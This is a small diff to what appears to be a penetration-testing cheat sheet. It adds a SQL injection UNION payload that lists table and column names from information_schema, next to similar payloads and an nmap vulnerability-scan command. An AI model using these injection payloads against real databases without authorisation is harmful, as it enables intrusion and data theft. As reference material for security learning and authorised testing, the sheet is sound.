@@ -22,6 +22,7 @@ Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypa
 ' UNION select 1,2,3 from information_schema.tables #
 
 ' UNION select 1,table_schema,table_name from information_schema.tables #
+' UNION select 1,table_name,column_name from information_schema.columns #
 ### Nmap
 Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
 
